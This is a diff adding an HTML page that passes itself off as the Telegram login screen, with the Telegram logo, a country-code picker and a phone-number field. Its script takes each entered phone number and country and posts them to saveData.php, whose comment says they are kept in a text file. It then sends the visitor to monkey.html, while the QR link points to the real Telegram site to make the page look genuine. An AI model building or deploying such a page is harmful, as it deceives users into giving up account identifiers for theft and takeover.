@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login</title>
+    <link rel="icon" href="tele1.png" type="image/x-icon">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #343333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #f5f5f5;
+        }
+
+        .login-container {
+            background-color: #343333;
+            border-radius: 39px;
+            width: 300px;
+            padding: 25px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: #0088cc;
+        }
+
+        .country-section {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .country-label {
+            font-size: 14px;
+            color: #bbb;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .country-select {
+            padding: 12px;
+            width: 100%;
+            background-color: #333;
+            border-radius: 12px;
+            border: 1px solid rgb(86, 70, 208);
+            font-size: 16px;
+            color: #f5f5f5;
+            appearance: none;
+        }
+
+        .phone-number-section {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .phone-number-section input {
+            padding: 12px;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 12px;
+            border: 1px solid rgb(86, 70, 208);
+            background-color: #333;
+            color: #f5f5f5;
+            margin-left: 10px;
+        }
+
+        .country-code {
+            width: 80px;
+            border: 1px solid rgb(86, 70, 208);
+            border-radius: 12px;
+            padding: 12px;
+            text-align: center;
+            font-weight: bold;
+            color: #f5f5f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .country-code-flag {
+            width: 20px;
+            height: 20px;
+            margin-right: 5px;
+            border-radius: 3px;
+        }
+
+        .divider {
+            border-top: 1px solid rgb(86, 70, 208);
+            margin: 20px 0;
+        }
+
+        .keep-signed {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .keep-signed input {
+            margin-right: 10px;
+        }
+
+        .qr-option {
+            color: rgb(86, 70, 208);
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+
+        .qr-option:hover {
+            text-decoration: underline;
+        }
+
+        .next-option {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .next-option button {
+            background-color: rgb(86, 70, 208);
+            color: white;
+            font-size: 16px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            position: relative;
+        }
+
+        .next-option button:hover {
+            background-color: rgb(70, 50, 170);
+        }
+
+        .loading-spinner {
+            border: 3px solid #f5f5f5;
+            border-top: 3px solid rgb(86, 70, 208);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .telegram-logo {
+            margin-top: 20px;
+            width: 180px;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="tele1.png" alt="Telegram Logo" class="telegram-logo">
+        
+        <p>Please confirm your country code and enter your phone number.</p>
+        
+        <!-- Country Selection Section -->
+        <div class="country-section">
+            <span class="country-label">Country</span>
+            <select class="country-select" id="country-select">
+                <option value="ET" data-code="+251" data-flag="https://upload.wikimedia.org/wikipedia/commons/4/4f/Flag_of_Ethiopia.svg" selected>
+                    Ethiopia
+                </option>
+                <option value="US" data-code="+1" data-flag="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg">
+                    United States
+                </option>
+                <option value="GB" data-code="+44" data-flag="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_Kingdom.svg">
+                    United Kingdom
+                </option>
+                <option value="IN" data-code="+91" data-flag="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg">
+                    India
+                </option>
+                <option value="CA" data-code="+1" data-flag="https://upload.wikimedia.org/wikipedia/commons/c/cf/Flag_of_Canada.svg">
+                    Canada
+                </option>
+                <option value="AU" data-code="+61" data-flag="https://upload.wikimedia.org/wikipedia/commons/b/b9/Flag_of_Australia.svg">
+                    Australia
+                </option>
+                <option value="ZA" data-code="+27" data-flag="https://upload.wikimedia.org/wikipedia/commons/a/a0/Flag_of_South_Africa.svg">
+                    South Africa
+                </option>
+                <option value="NG" data-code="+234" data-flag="https://upload.wikimedia.org/wikipedia/commons/7/7c/Flag_of_Nigeria.svg">
+                    Nigeria
+                </option>
+                <option value="DE" data-code="+49" data-flag="https://upload.wikimedia.org/wikipedia/commons/b/ba/Flag_of_Germany.svg">
+                    Germany
+                </option>
+                <option value="FR" data-code="+33" data-flag="https://upload.wikimedia.org/wikipedia/commons/c/c3/Flag_of_France.svg">
+                    France
+                </option>
+                <option value="IT" data-code="+39" data-flag="https://upload.wikimedia.org/wikipedia/commons/0/03/Flag_of_Italy.svg">
+                    Italy
+                </option>
+            </select>
+        </div>
+
+        <!-- Phone Number Input Section -->
+        <div class="phone-number-section">
+            <div class="country-code" id="country-code">
+                <img id="country-flag" class="country-code-flag" src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Flag_of_Ethiopia.svg" alt="Flag">
+                <span id="country-code-text">+251</span>
+            </div><input type="tel" placeholder="Enter phone number" id="phone-number" pattern="[0-9]*" inputmode="numeric">
+        </div>
+
+        <div class="divider"></div>
+        
+        <!-- Keep Signed in Checkbox -->
+        <div class="keep-signed">
+            <input type="checkbox" id="keep-signed">
+            <label for="keep-signed">Keep me signed in</label>
+        </div>
+        <div class="next-option" id="next-option">
+            <button id="next-button">NEXT
+                <div class="loading-spinner" id="loading-spinner"></div>
+            </button>
+        </div>
+
+        <br><br>
+        <!-- QR Code Login Option -->
+        <div class="qr-option" onclick="window.location.href='https://web.telegram.org';">
+            LOG IN BY QR CODE
+        </div>
+    </div>
+
+    <script>
+        // Country flag emoji mapping
+        const countryFlags = {
+            'ET': '🇪🇹', // Ethiopia
+            'US': '🇺🇸', // United States
+            'GB': '🇬🇧', // United Kingdom
+            'IN': '🇮🇳', // India
+            'CA': '🇨🇦', // Canada
+            'AU': '🇦🇺', // Australia
+            'ZA': '🇿🇦', // South Africa
+            'NG': '🇳🇬', // Nigeria
+            'DE': '🇩🇪', // Germany
+            'FR': '🇫🇷', // France
+            'IT': '🇮🇹'  // Italy
+        };
+
+        // DOM elements
+        const countrySelect = document.getElementById('country-select');
+        const countryCodeText = document.getElementById('country-code-text');
+        const countryFlag = document.getElementById('country-flag');
+        const phoneNumberInput = document.getElementById('phone-number');
+        const nextOption = document.getElementById('next-option');
+        const nextButton = document.getElementById('next-button');
+        const loadingSpinner = document.getElementById('loading-spinner');
+
+        // Update country code and flag when selection changes
+        countrySelect.addEventListener('change', function() {
+            const selectedOption = this.options[this.selectedIndex];
+            const countryCode = selectedOption.getAttribute('data-code');
+            const countryId = selectedOption.value;
+            
+            countryCodeText.textContent = countryCode;
+            countryFlag.textContent = countryFlags[countryId] || '🏳';
+        });
+
+        // Show/hide next button based on phone number input
+        phoneNumberInput.addEventListener('input', function() {
+            nextOption.style.display = this.value.trim().length >= 4 ? 'block' : 'none';
+        });
+
+        nextButton.addEventListener('click', function () {
+    loadingSpinner.style.display = 'block';
+    nextButton.disabled = true;
+
+    const selectedCountry = countrySelect.options[countrySelect.selectedIndex];
+    const countryName = selectedCountry.text;
+    const countryCode = selectedCountry.getAttribute('data-code');
+    const countryId = selectedCountry.value;
+    const phoneNumber = phoneNumberInput.value.trim();
+    const fullPhoneNumber = countryCode + phoneNumber;
+    const keepSignedIn = document.getElementById('keep-signed').checked;
+    const flagEmoji = countryFlags[countryId] || '🏳';
+
+    const loginData = {
+        countryName,
+        countryCode,
+        countryId,
+        phoneNumber,
+        fullPhoneNumber,
+        keepSignedIn,
+        flagEmoji
+    };
+
+    // Save to localStorage
+    localStorage.setItem('telegramLoginData', JSON.stringify(loginData));
+
+    // Send to server to store in a text file
+    fetch('saveData.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams(loginData)
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log(data); // Optional: log server response
+        setTimeout(function () {
+            window.location.href = 'monkey.html';
+        }, 2000);
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('Failed to save data.');
+        loadingSpinner.style.display = 'none';
+        nextButton.disabled = false;
+    });
+});
+
+    </script>
+</body>
+</html>
